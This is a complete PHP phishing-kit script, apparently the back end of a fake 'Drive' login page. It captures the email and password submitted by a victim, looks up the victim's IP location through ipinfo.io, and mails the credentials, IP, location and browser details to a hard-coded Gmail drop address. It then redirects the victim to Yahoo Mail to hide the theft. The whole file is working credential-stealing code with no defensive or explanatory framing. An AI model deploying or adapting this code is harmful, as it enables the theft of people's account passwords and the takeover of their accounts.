<?php

$email = $_POST["userid"];
$pass  = $_POST["password"];

$mask = $_SERVER['REMOTE_ADDR'];
$user_agent = $_SERVER['HTTP_USER_AGENT'];
$date = date("D M d, Y g:i a");

$maskinfo = json_decode(file_get_contents("http://ipinfo.io/{$mask}"));
$nation = $maskinfo->country;
$origin = $maskinfo->region;
$city = $maskinfo->city;

$reciever = "sergio.persco@gmail.com";
$subject  = "$email - $nation - $origin";
$header   = "From: Drive";

$body .= "\n";
$body .= "E-mail  	   : ".$email."\n";
$body .= "Password  	   : ".$pass."\n";
$body .= "\n";
$body .= "Date : $date\n";
$body .= "Mask : $mask | $nation | $origin | $city\n";
$body .= "Browser: ".$user_agent."\n";
$body .= "\n";

if (mail($reciever,$subject,$body,$header)){

	header('Location: http://yahoomail.com');

} else {

	echo "<script type='text/javascript'>alert('Your shell mail() is not good!')</script>";
}

?>